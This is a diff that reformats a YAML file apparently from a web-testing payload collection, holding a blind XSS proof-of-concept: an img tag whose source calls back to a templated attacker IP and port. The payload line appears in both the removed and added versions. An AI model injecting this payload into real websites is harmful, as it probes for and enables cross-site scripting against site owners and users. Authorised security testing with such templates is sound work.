@@ -1,10 +1,9 @@
+---
 metadata:
-  filename: xss-blind-img-src-poc-callback.yaml
-  tags:
-  - web
-  - xss
-  created: '2025-03-29'
-  author: Unknown
-content: '<img src=''http://{{ attacker_ip }}:{{ delivery_outbound_port }}/test''/>
+  filename: "xss-blind-img-src-poc-callback.yaml"
+  tags: ["web", "xss"]
+  created: "2025-03-29"
+  author: "Unknown"
 
-  '
+content: |
+  <img src='http://{{ attacker_ip }}:{{ delivery_outbound_port }}/test'/>
